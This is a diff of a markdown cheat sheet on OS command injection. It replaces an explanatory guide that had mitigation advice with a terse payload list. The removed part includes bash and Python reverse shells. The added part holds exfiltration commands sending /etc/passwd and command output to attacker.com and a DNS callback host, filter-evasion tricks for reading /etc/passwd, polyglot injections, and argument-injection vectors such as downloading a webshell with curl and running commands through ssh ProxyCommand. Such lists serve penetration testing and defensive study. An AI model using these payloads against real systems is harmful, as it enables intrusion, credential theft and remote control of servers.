@@ -1,108 +1,120 @@
 # Command Injection
 
-Operating system command injection occurs when user input is passed unsanitized to a shell
-or system command. The attacker executes arbitrary OS commands on the server.
-
----
-
-## Basic Command Injection
-
-**Category:** RCE
-**Severity context:** Critical — full server compromise, lateral movement potential.
-
-### How to identify it
-Look for parameters that feed into shell commands: `ping`, `nslookup`, `host`, `traceroute`,
-`whois`, `curl`, `wget`, `mail`. Submit a benign command separator (`;`, `&&`, `||`, `` ` ``, `$()`) with a
-sleeper command (`sleep 5`) and time the response.
-
-### How it works
-The application builds a command string using user input and passes it to a shell (e.g.
-`system()`, `exec()`, `shell_exec()`, `Runtime.exec()`, `subprocess.Popen()`). Shell
-metacharacters let you break out of the intended command and chain your own.
-
-### Exploitation
-```bash
-# Command separators
-; whoami         # semicolon (most reliable)
-| whoami         # pipe — feeds output as input
-&& whoami        # AND — runs only if first succeeds
-|| whoami        # OR — runs only if first fails
-`whoami`         # backtick — command substitution (Bourne shells)
-$(whoami)        # dollar-paren — POSIX command substitution
-
-# Blind detection via time delay
+## Chaining Operators
+```
+;    command1; command2        # sequential
+&&   command1 && command2      # AND (second runs if first succeeds)
+||   command1 || command2      # OR (second runs if first fails)
+|    command1 | command2       # pipe stdout
+&    command1 & command2        # background
+`    `command`                  # backtick substitution
+$()  $(command)                 # POSIX substitution
+```
+## Detection
+```
 ; sleep 5
 | sleep 5
 && sleep 5
+|| sleep 5
+`sleep 5`
 $(sleep 5)
-
-# Out-of-band exfiltration (DNS / HTTP)
+& ping -c 5 127.0.0.1 &
+```
+## Data Exfiltration
+```
 ; curl http://attacker.com/$(whoami)
 | nslookup $(whoami).attacker.com
-
-# Bypass simple filters — no-space payloads
-;{ls,-la}        # Brace expansion (Bash)
-$(IFS=;ls$IFS-la)  # IFS splitting
-;ls$9-la         # $9 is empty on most shells
-
-# URL-encoded newline injection (bypasses some PHP escapeshellarg)
-%0a whoami
+; wget --post-file=/etc/passwd http://attacker.com/
+; dig +short $(hostname).attacker.com TXT
+; for i in $(ls /); do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
-### Example
+## WAF Bypass Techniques
+### No-Space Bypass
 ```
-Vulnerable URL:  http://target.com/ping?host=8.8.8.8
-Payload:         http://target.com/ping?host=8.8.8.8;cat /etc/passwd
-Response:        Returns contents of /etc/passwd after ping output
+cat${IFS}/etc/passwd          # IFS as space
+{cat,/etc/passwd}              # brace expansion
+cat</etc/passwd                # input redirect
+ls%09-la%09/home               # tab (%09)
+{X=cat,/etc/passwd};$X
 ```
-
-### Mitigation
-Avoid shell-calling functions entirely. If unavoidable, use `escapeshellcmd()` /
-`escapeshellarg()` (PHP), `shlex.quote()` (Python), or `ProcessBuilder` with a string list
-(Java) — never concatenate into a shell string.
-
-### References
-- [PortSwigger: OS command injection](https://portswigger.net/web-security/os-command-injection)
-- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-
----
-
-## Blind Command Injection (Out-of-Band)
-
-**Category:** RCE (Blind)
-**Severity context:** Critical — same impact as basic, but no output rendered in the response.
-
-### How to identify it
-You submit commands but see no output difference in the HTTP response. Test with a
-time-based delay or an out-of-band channel (DNS lookup, HTTP callback to your listener).
-
-### How it works
-The application runs your command but discards or hides the output. You cannot read `stdout`,
-so you must either infer execution via side effects (timing, file creation, outbound
-connections) or exfiltrate data through a channel you control.
-
-### Exploitation
-```bash
-# Time-based confirmation
-& sleep 5 &
-| ping -c 5 127.0.0.1 &
-
-# Out-of-band — DNS exfil (set up tcpdump or Burp Collaborator)
-& nslookup $(whoami).burpcollaborator.net &
-| curl http://attacker.com/$(hostname) &
-
-# Write output to a web-accessible file
-; echo $(whoami) > /var/www/html/out.txt
-| ls /home > /var/www/html/users.txt
-
-# Reverse shell (if outbound connectivity)
-; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
-| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+### No-Slash Bypass
 ```
+cat ${HOME:0:1}etc${HOME:0:1}passwd         # env var slice
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+cat $(echo . | tr '!-0' '"-1')etc/$(echo . | tr '!-0' '"-1')passwd
+xxd -r -p <<< 2f6574632f706173737764
+```
+### Quote Insertion
+```
+w'h'o'am'i                    # single quotes
+w"h"o"am"i                    # double quotes
+wh``oami                      # backticks inside
+w\ho\am\i                     # backslash
+/\b\i\n/////s\h              # random slashes
+```
+### Variable Expansion
+```
+who$@ami                      # $@ expands to nothing
+who$()ami                     # $() expands to nothing
+who$(echo am)i                # subshell
+test=/ehhh/hmtc/pahhh/hmsswd; cat ${test//hhh\/hm/}
+/???/??t /???/p??s??          # wildcard globbing
+```
+### Hex Encoding
+```
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | xargs cat
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+```
+### Case Obfuscation (Windows)
+```
+wHoAmi                        # Windows is case-insensitive
+WhOaMi
+```
+### Backslash-Newline
+```
+cat /et\
+c/pa\
+sswd
+```
+### Polyglot Injection
+```
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+```
+### Argument Injection
+```
+# curl — write webshell via -o
+curl http://attacker.com/ -o webshell.php
 
-### Mitigation
-Same as basic command injection — never pass unsanitized input to shell functions.
-Additionally, restrict outbound network egress from the application server.
+# SSH — exec via ProxyCommand
+ssh '-oProxyCommand="touch /tmp/pwned"' foo@foo
 
-### References
-- [PortSwigger: Blind OS command injection](https://portswigger.net/web-security/os-command-injection/blind)
-- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+# Chrome — exec via --gpu-launcher
+chrome '--gpu-launcher="id>/tmp/foo"'
+
+# psql
+psql -o'|id>/tmp/foo'
+```
+### WorstFit (Windows ANSI Fullwidth Quotes)
+```
+# Using U+FF02 fullwidth double quotes instead of U+0022
+$url = "https://target/" + $_GET['path'] + ".txt";
+system("wget.exe -q " . escapeshellarg($url));
+# Payload: ＂ --use-askpass=calc ＂
+```
+### Remove Trailing Arguments
+```
+--   # double-dash ends option parsing
+;id --
+;id #
+;id //
+```
+### Background Long-Running Commands
+```
+nohup sleep 120 > /dev/null &
+```
+## References
+- [PayloadsAllTheThings CMDi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
+- [Argument Injection Vectors](https://sonarsource.github.io/argument-injection-vectors/)
